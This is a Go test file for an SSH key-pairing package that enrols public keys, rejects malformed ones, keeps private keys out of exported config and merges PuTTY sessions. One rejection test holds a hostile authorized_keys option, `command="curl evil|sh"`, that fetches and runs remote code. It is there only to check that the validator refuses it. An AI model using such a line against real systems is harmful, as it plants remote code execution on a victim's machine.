package pairing

import (
	"bytes"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/pem"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/tudiapps/portlight-cli/internal/putty"
	"github.com/tudiapps/portlight-cli/internal/sshconfig"
	"golang.org/x/crypto/ssh"
)

func newPublicKey(t *testing.T) string {
	t.Helper()
	pub, _, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	sshPub, _ := ssh.NewPublicKey(pub)
	return strings.TrimSpace(string(ssh.MarshalAuthorizedKey(sshPub)))
}

func TestEnrollWritesOnlyTheCanonicalKey(t *testing.T) {
	dir := t.TempDir()
	key := newPublicKey(t)

	if err := EnrollKey(key+" user@phone", dir, &bytes.Buffer{}); err != nil {
		t.Fatal(err)
	}
	data, _ := os.ReadFile(filepath.Join(dir, "authorized_keys"))
	if got := strings.TrimSpace(string(data)); got != key+" portlight-mobile" {
		t.Fatalf("authorized_keys = %q", got)
	}

	// Enrolling the same key again does not add a second line.
	if err := EnrollKey(key, dir, &bytes.Buffer{}); err != nil {
		t.Fatal(err)
	}
	again, _ := os.ReadFile(filepath.Join(dir, "authorized_keys"))
	if !bytes.Equal(data, again) {
		t.Fatalf("duplicate written: %q", again)
	}
}

func TestEnrollRejectsAnythingButOnePlainKey(t *testing.T) {
	key := newPublicKey(t)
	for name, input := range map[string]string{
		"forced command": `command="curl evil|sh" ` + key,
		"two lines":      key + "\n" + newPublicKey(t),
		"not a key":      "ssh-ed25519 notbase64",
		"empty":          "  ",
	} {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			err := EnrollKey(input, dir, &bytes.Buffer{})
			if err == nil {
				t.Fatal("accepted")
			}
			if name == "forced command" && !errors.Is(err, ErrKeyOptions) {
				t.Fatalf("err = %v", err)
			}
			if _, statErr := os.Stat(filepath.Join(dir, "authorized_keys")); statErr == nil {
				t.Fatal("authorized_keys written for a rejected key")
			}
		})
	}
}

func TestExportNeverPrintsPrivateKeys(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)
	sshDir := filepath.Join(home, ".ssh")
	if err := os.MkdirAll(sshDir, 0o700); err != nil {
		t.Fatal(err)
	}
	_, priv, _ := ed25519.GenerateKey(rand.Reader)
	block, _ := ssh.MarshalPrivateKey(priv, "")
	if err := os.WriteFile(filepath.Join(sshDir, "id_ed25519"), pem.EncodeToMemory(block), 0o600); err != nil {
		t.Fatal(err)
	}
	config := filepath.Join(sshDir, "config")
	if err := os.WriteFile(config, []byte("Host box\n  IdentityFile ~/.ssh/id_ed25519\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	for _, asJSON := range []bool{false, true} {
		var out, errOut bytes.Buffer
		if err := ExportConfig(config, asJSON, &out, &errOut); err != nil {
			t.Fatal(err)
		}
		if strings.Contains(out.String(), "PRIVATE KEY") {
			t.Fatalf("export (json=%t) printed a private key", asJSON)
		}
		if !strings.Contains(out.String(), "id_ed25519") {
			t.Fatalf("export (json=%t) does not list the key:\n%s", asJSON, out.String())
		}
	}

	// The real payload does carry it.
	payload, _, err := BuildPayload(config, sshconfig.LoadOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if len(payload.Keys) != 1 || !strings.Contains(payload.Keys[0].PrivateKey, "PRIVATE KEY") {
		t.Fatalf("payload keys = %v", payload.Keys)
	}
	if payload.Hosts[0].Key != "id_ed25519" {
		t.Fatalf("host key = %q", payload.Hosts[0].Key)
	}
}

func TestBuildPayloadAddsPuTTYSessions(t *testing.T) {
	old := puttySessions
	t.Cleanup(func() { puttySessions = old })
	puttySessions = func() (map[string]putty.Values, error) {
		return map[string]putty.Values{
			"box":        {"HostName": "other.example.com"},
			"prod%20db":  {"HostName": "admin@10.0.0.9", "PortNumber": uint64(2200)},
			"old-telnet": {"HostName": "legacy", "Protocol": "telnet"},
		}, nil
	}
	config := filepath.Join(t.TempDir(), "config")
	if err := os.WriteFile(config, []byte("Host box\n  HostName box.example.com\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	payload, warnings, err := BuildPayload(config, sshconfig.LoadOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if len(payload.Hosts) != 2 {
		t.Fatalf("hosts = %+v", payload.Hosts)
	}
	if payload.Hosts[0].HostName != "box.example.com" {
		t.Fatalf("ssh config host replaced by PuTTY: %+v", payload.Hosts[0])
	}
	db := payload.Hosts[1]
	if db.Alias != "prod db" || db.User != "admin" || db.Port != 2200 || db.Group != putty.Group {
		t.Fatalf("PuTTY host = %+v", db)
	}
	if len(warnings) != 1 {
		t.Fatalf("warnings = %v", warnings)
	}
}
